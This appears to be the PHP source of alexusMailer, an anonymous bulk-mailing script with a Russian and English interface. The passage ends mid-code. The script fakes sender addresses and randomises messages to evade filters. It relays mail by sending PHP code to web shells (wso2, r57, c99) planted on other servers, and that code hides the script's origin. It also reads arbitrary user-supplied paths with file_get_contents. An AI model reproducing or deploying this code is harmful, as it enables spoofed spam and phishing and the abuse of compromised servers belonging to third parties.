<?php $logpass=""; //FORMAT: md5(loginIMAILpassword); ?>
<?php
ini_set('display_errors',0);//1
ini_set('display_startup_errors',0);//1
error_reporting(0);//-1
?>
<?php header('Content-type: text/html; charset=utf-8;'); ?>
<?php
#Alexus(240980845) - http://www.a-l-e-x-u-s.ru/
#CREATED AT 15.12.2011
#UPD 02.04.2012 v 1.1
#UPD 10.04.2012 v 1.2
#UPD 30.05.2012 v 1.3
#UPD 02.06.2012 v 1.3.1
#UPD 20.10.2012 v 1.4
#UPD 16.02.2013 v 1.5
#UPD 15.04.2013 v 1.5.1
#UPD 01.06.2013 v 1.6
#UPD 15.09.2013 v 1.6.5
#UOD 30.04.2014 v 1.7
#UPD 11.08.2014 v 1.7.1
#UPD 02.10.2014 v 1.7.2
define("VERSION", "1.7");
$boundary="--".randomstr(10);

$lang="ru";
if (isset($_COOKIE['translation'])) 
	$lang=$_COOKIE['translation'];
if(isset($_POST['PROXY'])) {
	$proxy_server=parse_url($_POST['PROXY']);
	define("PROXY",$proxy_server['host'].":".$proxy_server['port']);
}

$translation=array(
	'ru'=>array(
		'status-idle'=>'простаиваем',
		'status-sending'=>'рассылка',
		'status-pause'=>'пауза',
		'process-resume'=>'Возобновить',
		'process-pause'=>'Приостановить',
		'process-cancel'=>'Отменить',
		'settings-primary'=>'Основные',
		'settings-outservers'=>'Внешние сервера',
		'settings-security'=>'Безопасность',
		'settings-history-length'=>'Длина истории отправки',
		'settings-outservers-doc'=>'Подробное описание работы с внешнеми серверами смотрите в <a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.ru.pdf"><span class="label label-warning">документации</span></a>',
		'settings-outservers-check'=>'<button class="btn" onclick="pingoutservers()">Проверить сервера</button> (недоступные будут автоматически удалены из списка)',
		'settings-outservers-check-log'=>'Лог проверки:',
		'settings-security-notwritable'=>' Отсутствует доступ на запись к скрипту! Смена пароля невозможна. <b>Измените права на 666</b> на время смены пароля.',
		'settings-security-password-changed'=>'Пароль успешно изменен!',
		'settings-security-password-not-changed'=>'При изменении пароля произошла ошибка, возможно файл скрипта недоступен на запись.',
		'settings-security-set-password'=>'Установить пароль',
		'settings-security-remove-password'=>'Удалить пароль',
		'settings-security-use-proxy'=>'Использовать http прокси',
		'main'=>'Главная',
		'help'=>'Помощь',
		'login'=>'Логин',
		'password'=>'Пароль',
		'settings'=>'Настройки',
		'name'=>'йаПосылалка',
		'title_service'=>'Сервис анонимной отправки почты с подменой адреса',
		'description_service'=>'Сервис анонимной отправки электронной почты с подменой адреса и прикреплением файлов йаПосылалка',
		'keywords_service'=>'Сервис анонимной отправки почты,анонимная отправка почты, анонимная отправка электронных сообшений, анонимная отправка сообшений, анонимное письмо, анонимный e mail ,отправить анонимный e mail,анонимная отправка e mail',
		'need_auth'=>'Для доступа необходима авторизация.',
		'wronglogpas'=>'Неправильный логин или пароль.',
		'sendedto'=>'Отправлено на ',
		'badcaptcha'=>'Неправильная captcha',
		'sendlimit'=>'Лимит отправок 1 в час',
		'sendavailable'=>'Отправка доступна',
		'sendlessminute'=>'Отправка менее чем через минуту',
		'sendafter'=>'Отправка через ',
		'sendafter2'=>' минут',
		'attachfile'=>'Прикрепление файла',
		'close'=>'Закрыть',
		'upload'=>'Загрузить',
		'uploadlist'=>'Загрузка списка',
		'uploadtemplate'=>'Загрузка шаблона',
		'preview'=>'Предпросмотр',
		'donatedevelopment'=>'Спонсировать разработку',
		'techsupport'=>'Техническая поддержка',
		'settings'=>'Настройки',
		'threadsnum'=>'Количество потоков:',
		'timeoutlen'=>'Длительность задржки в секундах:',
		'useoutservers'=>'Использовать внешние серверы для отправки',
		'unavalable_in_service'=>'недоступно в режиме сервиса',
		'less'=>'Меньше',
		'more'=>'Больше',
		'delete'=>'Удалить',
		'status'=>'Статус',
		'recipient'=>'Кому',
		'fromname'=>'От кого, имя',
		'frommail'=>'От кого, адрес email',
		'replymail'=>'Адрес ответа, email',
		'subject'=>'Тема',
		'subject_example'=>'выращивание бамбука под кроватью',
		'addfield'=>'Дополнительное поле',
		'addfield2'=>'доп. поле',
		'mailtype'=>'Тип письма',
		'plaintext'=>'обычный текст',
		'withformating'=>'с форматированием',
		'htmle'=>'html с переносом картинок в аттач',
		'captcha'=>'Проверочный код',
		'save'=>'Сохранить',
		'load'=>'Загрузить',
		'send'=>'Отправить',
		'backtoeditor'=>'Вернуться к редактированию',
		'hellopage'=>'<center><h2>Сервис йаПосылалка</h2></center>
				<p>
					
					Сервис йаПосылалка создан на базе одноименного скрипта анонимной отправки электронной почты. 
					Для сервиса всегда используется последняя версия скрипта, но при этом сервис имеет некоторые ограничения 
					для защиты его от использования в качестве спамера.
					<br><b>Ограничения:</b><br>
					<ol>
						<li>Разрешено отправлять одно письмо в час</li>
						<li>Для отправки необходимо вводить капчу</li>
						<li>Отображается реклама</li>
					</ol>
					<b>Сервис анонимной отправки почты абсолютно бесплатен</b> и существует в первую очедь в демонстрационных целях.<br>
					<center><button class="btn btn-primary btn-large prime-button">Отправить письмо</button></center>					
				</p>
				<p>
					Последнюю версию скрипта анонимной отправки для установки на своём сервере можно <b>купить за 25$ или 750 рублей</b>.
					<br>В ней <b>отсутствуют все ограничения</b> на отправку, и обеспечиваются:<br>
					<ol>
						<li>Помощь по использованию и установке</li>
						<li>Исправление найденых ошибок</li>
						<li>Приоритетный приём заявок по доработке</li>
						<li>Обновления в пределах текущей ветки</li>
					</ol>
					<center><a href="/buy/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Купить</a></center>
				</p>
				<p>
					У йаПосылалка существует <b>высокодоходная партнёрская программа</b>, если человек купит скрипт по вашей партнёрской ссылке,
					вы получаете <b>50% от стоимости</b> скрипта (12.5$ или 325 рублей) с каждой продажи.<br>
					<center><a href="/partner/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Стать партнёром!</a></center>
				</p>

				<script type="text/javascript">(function() {
		          if (window.pluso)if (typeof window.pluso.start == "function") return;
		          var d = document, s = d.createElement(\'script\'), g = \'getElementsByTagName\';
		          s.type = \'text/javascript\'; s.charset=\'UTF-8\'; s.async = true;
		          s.src = (\'https:\' == window.location.protocol ? \'https\' : \'http\')  + \'://share.pluso.ru/pluso-like.js\';
		          var h=d[g](\'head\')[0] || d[g](\'body\')[0];
		          h.appendChild(s);
		          })();</script>
		        <div data-description="Сервис анонимной отправки электронной почты с подменой адреса и прикреплением файлов йаПосылалка" data-title="Сервис анонимной отправки почты с подменой адреса - йаПосылалка" data-url="http://mailer.a-l-e-x-u-s.ru/" class="pluso" data-options="big,square,line,horizontal,counter,theme=08" data-services="vkontakte,odnoklassniki,facebook,twitter,google,moimir,email,print" data-background="#ebebeb"></div>
				
				<div id="vk_comments"></div>
				<script type="text/javascript">
				VK.Widgets.Comments("vk_comments", {limit: 10, width: "660", attach: false, norealtime:1}, "mailer.a-l-e-x-u-s.ru");
				</script>',
		'helppage'=>'<h2>Справка</h2>
				<h3>Что это?</h3>
				Сервис анонимной отправки email сообщений с произвольного/чужого адреса в текстовом или html формате.<br>
				<b>Формат html(e)</b> позволяет автоматически перенести в attach картинки из тегов img или атрибута background, что делает письмо автономным и не требует внешнего сервера для корректного отображения. 
				Так же в почтовых клиентах (the bat, outlook, ...) картинки отображаются сразу.<br>
				<b>esreveR</b> меняет символы в обратном порядке и устанавливает css для их отображения в верном порядке.<br>
				<b>Предпросмотр</b> позволяет посмотреть как будет выглядеть письмо когда все макросы будут заменены.<br>
				<b>Сохранение\Загрука</b> позволяет экономить время и делать шаблоны для часто используемых писем.<br>
				<b>Подгрузка списка</b> адресатов возможна нажатием на кнопку рядом с соотв. полем.<br>
				<b>Задержка</b> между отправкой писем<br>
				<b>Внешние серверы</b> для распределения рассылки между разными йаПосылалками <br><b style="color:red;">Перед использованием внешних посылалок проверьте корректность их работы на сервере</b>
				<br><br><a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.ru.pdf"><span class="label label-warning"><i class="icon-file icon-white"></i> Скачать полную документацию</span></a>
				<hr>
				<h3>Макросы (в теле письма и в заголовках)</h3>
				<ul>
					<li>Кому - <b>[TO-EMAIL]</b></li>
					<li>От кого, имя - <b>[FROM-NAME]</b></li>
					<li>От кого, адрес email - <b>[FROM-EMAIL]</b></li>
					<li>Тема - <b>[THEME]</b></li>
					<li>Дополнительное поле - <b>[ADD0]</b> , <b>[ADD1]</b>, <b>[ADD2]</b> ...</li>
					<li>Случайное число (5000..6000)- <b>[RAND]</b></li>
					<li>Случайное число (от A до B)- <b>[RAND-A-B]</b> , например <b>[RAND-10-99]</b></li>
					<li>Случайный текст - <b>[RAND:text1|text2|...]</b> , например <b>[RAND:hello dude|hello|hi|wazzup]</b></li>
					<li>Перечисление - <b>[ENUM:text1|text2|...]</b> , например <b>[ENUM:здравствуйте|привет|как дела]</b></li>
				 </ul>
				 <h3>Макросы даты и времени</h3>
				 <ul>
				 	<li><b>[DATE]</b> - Текущая дата (<b>[DATE-4]</b> - Текущая дата минус 4 дня) (<b>[DATE+4]</b> - Текущая дата плюс 4 дня)
				 		<ul>
				 			<li><b>[DAY]</b> - Текущий день (<b>[DAY+3]</b> - Текущий день плюс 3 дня)</li>
				 			<li><b>[MONTH]</b> - Текущий месяц (<b>[MONTH-2]</b> - Текущий месяц минус 2 месяца)</li>
				 			<li><b>[YEAR]</b> - Текущий год (<b>[YEAR-1]</b> - Текущий год минус 1 год)</li>
				 		</ul>
				 	</li>
				 	<li><b>[TIME]</b> - Текущее время (<b>[TIME-4]</b> - Текущее время минус 4 минуты)
				 		<ul>
				 			<li><b>[HOUR]</b> - Текущий час (<b>[HOUR-3]</b> - Текущий час минус 3 часа)</li>
				 			<li><b>[MINUTE]</b> - Текущий месяц (<b>[MINUTE-2]</b> - Текущая минута минус 2 минуты)</li>
				 		</ul>
				 	</li>
				 </ul>
				<hr>
				Внимание! Сервис предоставлен исключительно для ознакомления. Ответственность за возможно незаконное использование несете только Вы.'
	),
	'en'=>array(
		'status-idle'=>'Idle',
		'status-sending'=>'Sending',
		'status-pause'=>'Pause',
		'process-resume'=>'Resume',
		'process-pause'=>'Pause',
		'process-cancel'=>'Cancel',
		'settings-primary'=>'Primary',
		'settings-outservers'=>'External servers',
		'settings-security'=>'Security',
		'settings-history-length'=>'History max length',
		'settings-outservers-doc'=>'Read <a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.en.pdf"><span class="label label-warning">documentation</span></a> to learn more about external servers.',
		'settings-outservers-check'=>'<button class="btn" onclick="pingoutservers()">Check servers</button> (Unavailable will be auto-removed)',
		'settings-outservers-check-log'=>'Check log:',
		'settings-security-notwritable'=>'Script file is not writable! Password change imposible. <b>Change file rights to 666</b> for password change.',
		'settings-security-password-changed'=>'Password succesfully changed!',
		'settings-security-password-not-changed'=>'There was an error during pass change, may be script file is not writable.',
		'settings-security-set-password'=>'Set password',
		'settings-security-remove-password'=>'Remove password',
		'settings-security-use-proxy'=>'Use http proxy',
		'main'=>'Primary',
		'help'=>'Help',
		'login'=>'Login',
		'password'=>'Password',
		'settings'=>'Settings',
		'backtoeditor'=>'Back to editor',
		'name'=>'alexusMailer',
		'title_service'=>'Anonymous e-mail service',
		'description_service'=>'Сервис анонимной отправки электронной почты с подменой адреса и прикреплением файлов йаПосылалка',
		'keywords_service'=>'Сервис анонимной отправки почты,анонимная отправка почты, анонимная отправка электронных сообшений, анонимная отправка сообшений, анонимное письмо, анонимный e mail ,отправить анонимный e mail,анонимная отправка e mail',
		'need_auth'=>'Authentification required!',
		'wronglogpas'=>'Wrong login or password!',
		'sendedto'=>'Sended to ',
		'badcaptcha'=>'Wrong security code',
		'sendlimit'=>'Sending limit is 1 per hour',
		'sendavailable'=>'Sending available',
		'sendlessminute'=>'Sending will be available less in one minute',
		'sendafter'=>'Sending after ',
		'sendafter2'=>' minutes',
		'attachfile'=>'Attach file',
		'close'=>'Close',
		'upload'=>'Upload',
		'uploadlist'=>'Upload list',
		'uploadtemplate'=>'Upload template',
		'preview'=>'Preview',
		'donatedevelopment'=>'Donate to developer',
		'techsupport'=>'Tech Support',
		'settings'=>'Settings',
		'threadsnum'=>'Thread nubmer:',
		'timeoutlen'=>'Timeout in seconds:',
		'useoutservers'=>'Use external servers for sending',
		'unavalable_in_service'=>'unavailable in service mode',
		'less'=>'Less',
		'more'=>'More',
		'delete'=>'Delete',
		'status'=>'Status',
		'recipient'=>'Recipient',
		'fromname'=>'From, name',
		'frommail'=>'From, email',
		'replymail'=>'Reply-to, email',
		'subject'=>'Subject',
		'subject_example'=>'Growing bamboo under the bed',
		'addfield'=>'Additional field',
		'addfield2'=>'add. field',
		'mailtype'=>'Mail type',
		'plaintext'=>'plain text',
		'withformating'=>'with formating',
		'htmle'=>'html with image auto-attach',
		'captcha'=>'Security code',
		'save'=>'Save',
		'load'=>'Load',
		'send'=>'Send',
		'hellopage'=>'<center><h2>alexusMailer service</h2></center>
				<p>
					alexusMailer service is based on the eponymous script to send an anonymous e-mail.
					For this service is always used the latest version of the alexusMailer, but it have some limitations to protect it from being used as a spammer.
					<br><b>Limitations:</b><br>
					<ol>
						<li>Allowed to send one letter per hour</li>
						<li>To send you must enter the captcha</li>
						<li>Advertisement</li>
					</ol>
					<b>Anonymous mailing service is completely free</b> and exists in demonstration purposes.<br>
					<center><button class="btn btn-primary btn-large prime-button">Send mail</button></center>					
				</p>
				<p>
					You can by the latest version of alexusMailer - anonymous mailing script for installing on your own server <b>for 25 USD</b>.
					<br>This version <b>have no any limitations</b> and gives you:<br>
					<ol>
						<li>Full support in installation and using</li>
						<li>Fixing of all errors you can find</li>
						<li>Priority accepting applications for upgrading</li>
						<li>Free updates in current major version (1.*)</li>
					</ol>
					<center><a href="/en/buy/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Buy alexusMailer</a></center>
				</p>
				<p>
					alexusMailer has a <b>highly profitable partnership program</b>, if a person buys alexusMailer on your affiliate link
					you get <b>50% of the cost</b> (12.5 USD) per sale.<br>
					<center><a href="/en/partner/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Became a partner!</a></center>
				</p>

				<script type="text/javascript">(function() {
		          if (window.pluso)if (typeof window.pluso.start == "function") return;
		          var d = document, s = d.createElement(\'script\'), g = \'getElementsByTagName\';
		          s.type = \'text/javascript\'; s.charset=\'UTF-8\'; s.async = true;
		          s.src = (\'https:\' == window.location.protocol ? \'https\' : \'http\')  + \'://share.pluso.ru/pluso-like.js\';
		          var h=d[g](\'head\')[0] || d[g](\'body\')[0];
		          h.appendChild(s);
		          })();</script>
		        <div data-description="Anonymous e-mail service with attaching files - alexusMailer" data-title="Anonymous remailer - alexusMailer" data-url="http://mailer.a-l-e-x-u-s.ru/en/" class="pluso" data-options="big,square,line,horizontal,counter,theme=08" data-services="vkontakte,odnoklassniki,facebook,twitter,google,moimir,email,print" data-background="#ebebeb"></div>
				',
		'helppage'=>'<h2>Help</h2>
				<h3>What is it?</h3>
				Anonymous mailing service from random or foreign email in plain text or html format.<br>
				<b>Format html(e)</b> allows automatically move images from img tag or background attribute to attach, what makes letter independent from external server for correct display. 
				Also in e-mail clients (the bat, outlook, ...) will be displayed immediately.<br>
				<b>esreveR</b> change symbol possition in back order and set css for correct display in mail.<br>
				<b>Preview</b> can hepl to see how mail will look after all macro will be replaced.<br>
				<b>Save\Load</b> is helpful in making collection of regular mailing templates.<br>
				<b>Recipient list loading</b> available by clicking on button near the recipient field.<br>
				<b>Timeout</b> between sending mails.<br>
				<b>External servers</b> for distributing you mails between different servers <br><b style="color:red;">Before using external servers ensure that they work correct.</b>
				<br><br><a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.en.pdf"><span class="label label-warning"><i class="icon-file icon-white"></i> Download full documentation</span></a>
				<hr>
				<h3>Macro (in mail body, headers and additional fields)</h3>
				<ul>
					<li>Recipient - <b>[TO-EMAIL]</b></li>
					<li>From, name - <b>[FROM-NAME]</b></li>
					<li>From, email - <b>[FROM-EMAIL]</b></li>
					<li>Subject - <b>[THEME]</b></li>
					<li>Additional field - <b>[ADD0]</b> , <b>[ADD1]</b>, <b>[ADD2]</b> ...</li>
					<li>Random number (5000..6000)- <b>[RAND]</b></li>
					<li>Random number (from A to B)- <b>[RAND-A-B]</b> , example <b>[RAND-10-99]</b></li>
					<li>Random text - <b>[RAND:text1|text2|...]</b> , example <b>[RAND:hello dude|hello|hi|wazzup]</b></li>
					<li>Enumeration - <b>[ENUM:text1|text2|...]</b> , example <b>[ENUM:wellcome|hi|how are you]</b></li>
				 </ul>
				 <h3>Macro for date and time</h3>
				 <ul>
				 	<li><b>[DATE]</b> - Current date (<b>[DATE-4]</b> - Current date minus 4 days) (<b>[DATE+4]</b> - Current date plus 4 days)
				 		<ul>
				 			<li><b>[DAY]</b> - Current day (<b>[DAY+3]</b> - Current day plus 3 days)</li>
				 			<li><b>[MONTH]</b> - Current month (<b>[MONTH-2]</b> - Current month minus 2 months)</li>
				 			<li><b>[YEAR]</b> - Current year (<b>[YEAR-1]</b> - Current year minus 1 year)</li>
				 		</ul>
				 	</li>
				 	<li><b>[TIME]</b> - Current time (<b>[TIME-4]</b> - Current time minus 4 minutes)
				 		<ul>
				 			<li><b>[HOUR]</b> - Current hour (<b>[HOUR-3]</b> - Current hour minus 3 hours)</li>
				 			<li><b>[MINUTE]</b> - Current minute (<b>[MINUTE-2]</b> - Current minute minus 2 minutes)</li>
				 		</ul>
				 	</li>
				 </ul>
				<hr>
				Warning! This service was created only in demonstration purposes. All responsibility for out law actions is only on you!'
	)	
);
function tr($name, $iface=true) {
	global $lang, $translation;
	if($iface)
		print "<span class='tr-$name'>".$translation[$lang][$name]."</span>";
	else
		print $translation[$lang][$name];
	return;
}

if($logpass!="") {
	if(!isset($_SERVER['PHP_AUTH_USER'])) {
		header('WWW-Authenticate: Basic realm="IMAIL"');
	    header('HTTP/1.0 401 Unauthorized');
	    print tr('need_auth',false);
	    exit;
	} else {
		if(md5($_SERVER['PHP_AUTH_USER']."IMAIL".$_SERVER['PHP_AUTH_PW'])!=$logpass) {
			header('WWW-Authenticate: Basic realm="IMAIL"');
	    	header('HTTP/1.0 401 Unauthorized');
			print tr('wronglogpas',false);
			exit;
		}
	}
}

if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ?
                    array_map('stripslashes_deep', $value) :
                    stripslashes($value);

        return $value;
    }

    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}



if($_SERVER['QUERY_STRING']=="send" || $_SERVER['QUERY_STRING']=="preview") {
	$email=array(
		to=>		$_POST['to'],
		fromname=>	$_POST['fromname'],
		frommail=>	$_POST['frommail'],
		replymail=>	$_POST['replymail'],
		tema=>		$_POST['tema'],
		additional=>$_POST['additional'],
		text=>		$_POST['text'],
		enumer=>	$_SERVER['QUERY_STRING']=="preview"?1:$_POST['enumer']	
	);
	//замена списочных значений
	$email[fromname]=applyEnumer($email[fromname], $email[enumer]);
	$email[frommail]=applyEnumer($email[frommail], $email[enumer]);
	$email[replymail]=applyEnumer($email[replymail], $email[enumer]);
	$email[tema]=applyEnumer($email[tema], $email[enumer]);	

	ReplaceFileTemplate($email[to], $email);
	if($_POST['type']=='text')
		$tip="text/plain";
	else
		$tip="text/html";

		ReplaceTemplates($email[text], $email);
	ReplaceTemplates($email[fromname], $email);
	ReplaceTemplates($email[frommail], $email);
	ReplaceTemplates($email[tema], $email);
	foreach ($email[additional] as $key => $value)
		ReplaceTemplates($email[additional][$key], $email);

	$fromname=trim($email[fromname]); $fromname=substr($fromname,0,100);
	$frommail=trim($email[frommail]);  $frommail=substr($frommail,0,100);
	
	$from="=?UTF-8?B?".base64_encode($fromname)."?= <$frommail>";
	$tema=$email[tema]; 

	$header="From: $from\n";
	//$header.="Subject: $tema\n";
	$header.="Content-type: $tip; charset=utf-8\n";
	if(trim($email[replymail])!='')
		$header.="Reply-To: {$email[replymail]}\n";

	if($_SERVER['QUERY_STRING']=="preview") {
		print $email[text];
		exit;
	}
	if($_POST['type']=='htmle' || isset($_POST['files'])) {
		$header="From: $from\n";
		//$header.="Subject: $tema\n";
		$header.="MIME-Version: 1.0;\n";
		$header.="Content-type: multipart/mixed; boundary=\"$boundary\"\n";
		if(trim($email[replymail])!='')
			$header.="Reply-To: {$email[replymail]}\n";

		$content="--$boundary\n";
		$content.="Content-type: text/html; charset=\"utf-8\"\n";
		$content.="Content-Transfer-Encoding: 8bit\n\n";
	}

	if($_POST['type']=='htmle') {
		preg_match_all('~<img.*?src=\"(.+?)\".*?>~si',$email[text],$matches);
		preg_match_all('~background="(.+?)"~si',$email[text],$matches2);

		$img_matches=array_merge($matches[1],$matches2[1]);
  		$i = 0;
  		$paths = array();

  		foreach ($img_matches as $img) {
  			if($paths[$i-1]['path']==$img) continue;
  			$paths[$i]['path']=$img;
  			if(preg_match("/\.gif/i", $img)) {
    			$paths[$i]['type']='gif';
    		} else if(preg_match("/\.png/i", $img)) {
    			$paths[$i]['type']='png';
    		} else if(preg_match("/\.(jpeg|jpg)/i", $img)) {
    			$paths[$i]['type']='jpeg';
    		} else {
    			$paths[$i]['type']='unknown';
    		}
    		$paths[$i]['cid']=md5($img);
    		$email[text] = str_replace($img,'cid:'.$paths[$i]['cid'],$email[text]);
    		
    		$i++;    		
  		}

		$content.=$email[text]."\n";
		if(isset($_POST['files'])) $content.=makeAttach(json_decode($_POST['files'], true), $boundary);

		foreach($paths as $img) {
			$content.="--$boundary\n";
			if($img['type']=="unknown")
				$content.="Content-Type: application/octet-stream; name=\"".$img['cid'].".png\"\n";
			else
				$content.="Content-Type: image/".$img['type']."; name=\"".$img['cid'].".".$img['type']."\"\n";
			$content.="Content-Transfer-Encoding:base64\n";
			$content.="Content-ID: <".$img['cid'].">\n\n";
			$content.=chunk_split(base64_encode(file_get_contents($img['path'])))."\n";
		}
		$content.="--$boundary--\n";
	} elseif(isset($_POST['files'])) {
		$content.=$email[text]."\n";
		$content.=makeAttach(json_decode($_POST['files'], true), $boundary);
		$content.="--$boundary--\n";
	} else {
		$content=$email['text'];
	}
/**
Зона дебага
Симулируем отправку(медленно и четко)
*/
/*sleep(1);
echo tr('sendedto',false).$email[to];
exit;*/

/**
Зона дебага
*/
	if($_SERVER['QUERY_STRING']=="send" && isset($_POST['outserver'])) {
		$data=json_encode(array(
				'to'=>$email[to],
				'subject'=>$tema,
				'content'=>base64_encode($content),
				'header'=>$header
			)
		);
		
		
		$code="\$hide=array('PHP_SELF'=>'','SCRIPT_FILENAME'=>'','REQUEST_URI'=>'','SCRIPT_NAME'=>'');while(list(\$key,)=each(\$hide)){\$hide[\$key]=\$_SERVER[\$key];\$_SERVER[\$key]='/';}\$data=json_decode('{$data}',true);mail(\$data['to'],\$data['subject'],base64_decode(\$data['content']),\$data['header']);reset(\$hide);while(list(\$key,)=each(\$hide))\$_SERVER[\$key]=\$hide[\$key];print 'sended';";
		$outserver=$_POST['outserver'];
		list($url,$type,$pass)=explode("|",$outserver);
		if($type=="wso2") {
			$answer=wso2exec($url,$pass,$code);
			print $answer=="sended"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
	    	exit;
		} elseif($type=="r57") {
			list($login,$pass)=explode(":", $pass);
			$answer=r572exec($url,$login,$pass,$code);
			print $answer=="sended"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
	    	exit;
		} elseif($type=="c99") {
			list($login,$pass)=explode(":", $pass);
			$answer=c992exec($url,$login,$pass,$code);
			print $answer=="sended"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
	    	exit;
		} elseif($type=="ars") {
			//list($login,$pass)=explode(":", $pass);
			$answer=ars2exec($url,$pass,"mail",$data);
			print $answer['status']=="GOOD"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
	    	exit;
		} else {
			print "WRONG OUT SERVER TYPE";
			exit;
		}
	} else {
		//print $content;
		//print $header;
		if(function_exists("mb_orig_mail"))
			mb_orig_mail($email[to], $tema, $content, $header);
		else
			mail($email[to], $tema, $content, $header);
		
	}
		
	echo tr('sendedto',false).$email[to];
	exit;
} elseif ($_SERVER['QUERY_STRING']=="send_from_template") {
	$template=str_replace("&amp;", "&", $_POST['template']);
	list($template,$text)=explode("[TEXT]", $template);
	$content=explode("\n", $template);
	$post=array();
	$post['to']=$_POST['to'];
	$post['replymail']=$_POST['replymail'];
	$post['text']=$text;
	for($i=0; $i<count($content);$i++) {
		if(strpos($content[$i], "[FROM-NAME]")!==false) {
			$content[$i]=str_replace("[FROM-NAME]","",$content[$i]);
			$post['fromname']=$content[$i];
		} elseif(strpos($content[$i], "[FROM-EMAIL]")!==false) {
			$content[$i]=str_replace("[FROM-EMAIL]","",$content[$i]);
			$post['frommail']=$content[$i];
		} elseif(strpos($content[$i], "[THEME]")!==false) {
			$content[$i]=str_replace("[THEME]","",$content[$i]);
			$post['tema']=$content[$i];
		} elseif(strpos($content[$i], "[TYPE]")!==false) {
			$content[$i]=str_replace("[TYPE]","",$content[$i]);
			$post['type']=$content[$i];
		} elseif(strpos($content[$i], "[FILES]")!==false) {
			$content[$i]=str_replace("[FILES]","",$content[$i]);
			$post['files']=$content[$i];
		} elseif(strpos($content[$i], "[ADD")!==false) {
			$result=preg_match("/\[ADD(\d+)\]/", $content[$i], $arr);
			$post['additional['.$arr[1].']']=str_replace($arr[0], "", $content[$i]);
		}
	}
	//print_r($post);
	$requrl='http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?send';
	//print $requrl.PHP_EOL;
	$headers=array();
	$headers[]='Content-type: application/x-www-form-urlencoded';

	$opts = array('http' =>
		array(
			'method'  => 'POST',
			//'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
			'header'  => implode(PHP_EOL, $headers),
	        //'timeout' => $timeout,
			'content' => http_build_query($post)
		)
	);
	//print_r($opts);
	$context  = stream_context_create($opts);
	$response=@file_get_contents($requrl, false, $context);
	print $response;
	exit;

} elseif ($_SERVER['QUERY_STRING']=="upload_form") {
	print "<form action='".$_SERVER['PHP_SELF']."?upload' method='post' enctype='multipart/form-data'><input type='file' name='elist'>";

	exit;

} elseif ($_SERVER['QUERY_STRING']=="upload") {
	if ($_FILES["elist"]["error"] > 0) {
   		echo "Error: " . $_FILES["elist"]["error"] . "<br />";
   	} else {
   		print "<html><body onload='window.parent.upload_finished(document.body.textContent||document.body.innerText)'>".file_get_contents($_FILES["elist"]["tmp_name"])."</body></html>";
   	}
   	exit;
} elseif ($_SERVER['QUERY_STRING']=="upload_universal") {
	if(!isset($_POST['sended'])) {
		print "<form action='".$_SERVER['PHP_SELF']."?upload_universal' method='post' enctype='multipart/form-data'><input type='hidden' name='sended' value='true'><input type='file' name='elist'>";
	exit;
	} else {
		if ($_FILES["elist"]["error"] > 0) {
	   		echo "Error: " . $_FILES["elist"]["error"] . "<br />";
	   	} else {
	   		print "<html>
	   		<body onload='window.parent.uploadFinishedHandler(document.body.textContent||document.body.innerText)'>".
	   		base64_encode(json_encode(array(
	   			"name" => $_FILES["elist"]["name"],
	   			"type" => $_FILES["elist"]["type"],
				"size" => $_FILES["elist"]["size"],
				"content" => base64_encode(file_get_contents($_FILES["elist"]["tmp_name"]))
	   		))).
	   		"</body></html>";
	   	}
	   	exit;
	}
	if ($_FILES["elist"]["error"] > 0) {
   		echo "Error: " . $_FILES["elist"]["error"] . "<br />";
   	} else {
   		print "<html><body onload='window.parent.upload_finished(document.body.textContent||document.body.innerText)'>".file_get_contents($_FILES["elist"]["tmp_name"])."</body></html>";
   	}
   	exit;

} elseif ($_SERVER['QUERY_STRING']=="loadsave") {
	if(isset($_FILES["elist"])) {
		print "<html><body onload='window.parent.loadsave(document.body.innerHTML)'>".file_get_contents($_FILES["elist"]["tmp_name"])."</body></html>";
	} else {
		print "<form action='".$_SERVER['PHP_SELF']."?loadsave' method='post' enctype='multipart/form-data'><input type='file' name='elist'></form>";
	}
	exit;
} elseif ($_SERVER['QUERY_STRING']=="savedata") {
	if(isset($_POST['savedata'])) {
		header ("Content-Type: application/force-download");
		header ("Accept-Ranges: bytes");
		header ("Content-Length: ".strlen(($_POST['savedata']))); 
		header ("Content-Disposition: attachment; filename=template.txt");  
		print $_POST['savedata'];
	} else {
		print "<form action='".$_SERVER['PHP_SELF']."?savedata' method='post'><textarea name='savedata'></textarea>
	<input type='submit' value='Upload'></form>";
	}
	exit;
} elseif ($_SERVER['QUERY_STRING']=="changepass") {
	clearstatcache();
	$response=array();
	if(!is_writable(__FILE__)) {
		$response['result']="error";
	} elseif($_POST['login']=="" && $_POST['pass']=="") {
		$data=file_get_contents(__FILE__);
		$data=str_replace($logpass, "", $data);
		file_put_contents(__FILE__, $data);
		$response['result']="ok";
	} else {
		$new_logpass=md5($_POST['login']."IMAIL".$_POST['pass']);
		$data=file_get_contents(__FILE__);
		if($logpass=="") {
			$data=str_replace('$logpass="";', '$logpass="'.$new_logpass.'";', $data);
		} else {
			$data=str_replace($logpass, $new_logpass, $data);
		}
		//$data=preg_replace("/$logpass=\".*?\";/", "$logpass=\"".$new_logpass."\";", $data, 1);
		file_put_contents(__FILE__, $data);
		$response['result']="ok";
	}
	//print $new_logpass.PHP_EOL;
	//print $data;
	print json_encode($response);
	exit;
} elseif ($_SERVER['QUERY_STRING']=="diagnostics") {
	clearstatcache();
	$state=array(
		'self_permissions'=>(int)is_writable(__FILE__),
		'dir_permissions' =>(int)is_writable("."),
		'mail_function'	  =>(int)function_exists("mail"),
